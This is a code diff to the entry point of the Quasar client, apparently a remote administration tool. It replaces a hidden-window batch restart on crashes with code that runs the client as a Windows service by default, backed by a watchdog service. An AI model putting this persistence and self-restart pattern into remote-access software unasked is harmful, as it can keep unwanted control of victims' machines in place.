@@ -1,9 +1,7 @@
-﻿using Quasar.Client.IO;
+﻿using Quasar.Client.Services;
 using System;
-using System.Diagnostics;
-using System.Net;
-using System.Threading;
-using System.Windows.Forms;
+using System.Linq;
+using System.ServiceProcess;
 
 namespace Quasar.Client
 {
@@ -12,79 +10,65 @@ namespace Quasar.Client
         [STAThread]
         private static void Main(string[] args)
         {
-            // enable TLS 1.2
-            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            var mode = DetermineMode(args, out var watchdogTarget);
+            RuntimeEnvironment.SetMode(mode);
 
-            // Set the unhandled exception mode to force all Windows Forms errors to go through our handler
-            Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
-
-            // Add the event handler for handling UI thread exceptions
-            Application.ThreadException += HandleThreadException;
-
-            // Add the event handler for handling non-UI thread exceptions
-            AppDomain.CurrentDomain.UnhandledException += HandleUnhandledException;
-
-            Application.EnableVisualStyles();
-            Application.SetCompatibleTextRenderingDefault(false);
-            Application.Run(new QuasarApplication());
-        }
-
-        private static void HandleThreadException(object sender, ThreadExceptionEventArgs e)
-        {
-            Debug.WriteLine(e);
-            try
+            switch (mode)
             {
-                string batchFile = BatchFile.CreateRestartBatch(Application.ExecutablePath);
-
-                ProcessStartInfo startInfo = new ProcessStartInfo
-                {
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    UseShellExecute = true,
-                    FileName = batchFile
-                };
-                Process.Start(startInfo);
-            }
-            catch (Exception exception)
-            {
-                Debug.WriteLine(exception);
-            }
-            finally
-            {
-                Environment.Exit(0);
+                case RuntimeMode.Service:
+                    ServiceBase.Run(new QuasarService(args));
+                    break;
+                case RuntimeMode.Watchdog:
+                    ServiceBase.Run(new WatchdogService(watchdogTarget));
+                    break;
+                default:
+                    ClientRuntime.Run(args);
+                    break;
             }
         }
 
-        /// <summary>
-        /// Handles unhandled exceptions by restarting the application and hoping that they don't happen again.
-        /// </summary>
-        /// <param name="sender">The source of the unhandled exception event.</param>
-        /// <param name="e">The exception event arguments. </param>
-        private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
+        private static RuntimeMode DetermineMode(string[] args, out string watchdogTarget)
         {
-            if (e.IsTerminating)
+            watchdogTarget = null;
+            if (args != null)
             {
-                Debug.WriteLine(e);
-                try
+                for (int i = 0; i < args.Length; i++)
                 {
-                    string batchFile = BatchFile.CreateRestartBatch(Application.ExecutablePath);
+                    var arg = args[i];
+                    if (IsFlag(arg, "service"))
+                        return RuntimeMode.Service;
 
-                    ProcessStartInfo startInfo = new ProcessStartInfo
+                    if (IsFlag(arg, "watchdog"))
                     {
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        UseShellExecute = true,
-                        FileName = batchFile
-                    };
-                    Process.Start(startInfo);
-                }
-                catch (Exception exception)
-                {
-                    Debug.WriteLine(exception);
-                }
-                finally
-                {
-                    Environment.Exit(0);
+                        if (TryReadNextArg(args, i, out var target))
+                        {
+                            watchdogTarget = target;
+                            i++;
+                        }
+                        return RuntimeMode.Watchdog;
+                    }
+
+                    if (IsFlag(arg, "interactive"))
+                        return RuntimeMode.Interactive;
                 }
             }
+
+            // Default to service mode unless explicitly overridden. This ensures unattended deployments
+            // always register/run as a Windows service.
+            return RuntimeMode.Service;
+        }
+
+        private static bool IsFlag(string value, string flag) =>
+            value.StartsWith("--", StringComparison.OrdinalIgnoreCase) && string.Equals(value.Substring(2), flag, StringComparison.OrdinalIgnoreCase);
+
+        private static bool TryReadNextArg(string[] args, int currentIndex, out string value)
+        {
+            value = null;
+            var nextIndex = currentIndex + 1;
+            if (args == null || nextIndex >= args.Length)
+                return false;
+            value = args[nextIndex];
+            return true;
         }
     }
 }
